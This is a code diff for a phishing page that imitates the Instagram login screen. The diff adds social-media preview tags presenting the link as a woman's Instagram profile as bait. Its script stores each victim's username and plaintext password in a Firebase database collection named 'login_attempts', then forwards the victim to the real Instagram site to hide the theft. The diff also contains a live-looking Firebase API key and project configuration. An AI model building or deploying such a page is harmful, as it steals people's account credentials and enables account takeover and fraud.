@@ -4,11 +4,39 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    
+    <!-- Open Graph / Facebook / WhatsApp / Instagram Meta Tags -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://your-domain.com/">
+    <meta property="og:title" content="Tamanna Sharma - Instagram Profile">
+    <meta property="og:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!">
+    <meta property="og:image" content="https://your-domain.com/images/main.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile">
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:locale" content="en_US">
+    
+    <!-- Instagram Specific Meta Tags -->
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:secure_url" content="https://your-domain.com/images/main.png">
+    
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://your-domain.com/">
+    <meta name="twitter:title" content="Tamanna Sharma - Instagram Profile">
+    <meta name="twitter:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!">
+    <meta name="twitter:image" content="https://your-domain.com/images/main.png">
+    
+    <!-- Additional Meta Tags for Better SEO -->
+    <meta name="description" content="Log in to Instagram to see photos and videos from your friends.">
+    <meta name="keywords" content="Instagram, login, social media, photos, videos">
+    <meta name="author" content="Instagram">
     <link rel="stylesheet" href="./style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-    <link rel="icon" href="./images/instagram.png" type="image/x-icon">
+    <link rel="icon" href="./images/logo.png" type="image/x-icon">
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
@@ -24,8 +52,7 @@
                 <div class="login-box">
                     <img src="images/logo.png" alt="Instagram" class="logo">
                     
-                   <!-- In your HTML, update the form tag: -->
-<form id="loginForm" class="login-form" onsubmit="return false;">
+                    <form id="loginForm" class="login-form">
                         <div class="form-group">
                             <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                         </div>
@@ -92,55 +119,41 @@
         const firebaseConfig = {
             apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
             authDomain: "insta-7f34f.firebaseapp.com",
+            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
             projectId: "insta-7f34f",
             storageBucket: "insta-7f34f.firebasestorage.app",
             messagingSenderId: "981637167144",
             appId: "1:981637167144:web:841af72e833be6ed081d1d"
         };
-    
+      
         // Initialize Firebase
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-    
-        // Function to handle form submission
-        async function handleLogin(event) {
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
-            console.log("Form submission started");
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
             try {
-                console.log("Storing data...");
+                // Store in Firebase
                 await db.collection("login_attempts").add({
                     username: username,
                     password: password,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                     userAgent: navigator.userAgent,
-                    timestampClient: new Date().toISOString(),
-                    source: window.location.hostname
+                    timestampClient: new Date().toISOString()
                 });
-                console.log("Data stored successfully");
                 
-                // Get redirect URL from Firestore
-                const doc = await db.collection("config").doc("redirect").get();
-                const redirectUrl = doc.exists && doc.data().url 
-                    ? doc.data().url 
-                    : "https://www.instagram.com/";
-                
-                console.log("Redirecting to:", redirectUrl);
-                window.location.href = redirectUrl;
-                
+                // Redirect to Instagram after successful storage
+                window.location.href = "https://www.instagram.com/";
             } catch (error) {
-                console.error("Error:", error);
-                // On error, redirect to default URL
+                console.error("Error storing data: ", error);
+                // Still redirect even if storage fails
                 window.location.href = "https://www.instagram.com/";
             }
-        }
-    
-        // Add event listener when the page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('loginForm').addEventListener('submit', handleLogin);
         });
     </script>
 </body>
